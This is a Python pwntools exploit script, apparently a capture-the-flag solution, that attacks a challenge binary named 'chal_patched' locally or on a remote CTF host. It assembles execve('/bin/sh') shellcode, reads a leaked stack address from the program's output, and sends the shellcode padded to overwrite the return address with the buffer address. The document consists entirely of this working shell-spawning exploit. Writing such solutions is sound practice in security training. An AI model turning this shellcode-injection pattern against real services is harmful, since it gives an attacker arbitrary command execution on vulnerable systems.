#!/usr/bin/env python3
from pwn import *
elf = ELF("chal_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hb', '-F', '#\x7bpane_pid\x7d', '-P']
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        # ncat --ssl where.harkonnen.b01lersc.tf 8443
        io = remote("where.harkonnen.b01lersc.tf", 8443, ssl=True)
    elif args.GDB:
        gdbscript = """
            b * 0x040124a
            c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        io = process([elf.path])
    return io

r = conn()

sh = ''' 
    sub rsp, 0x100
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push SYS_execve 
    pop rax
    syscall
'''
sh = asm(sh)
print(len(sh))

r.recvuntil(b'fun... ')
leak = int(r.recvline().strip(), 16)
print(hex(leak))
buf = leak + 8

payload = sh.ljust(0x28, b'\x00')
payload += p64(buf)

r.sendline(payload)

r.interactive()
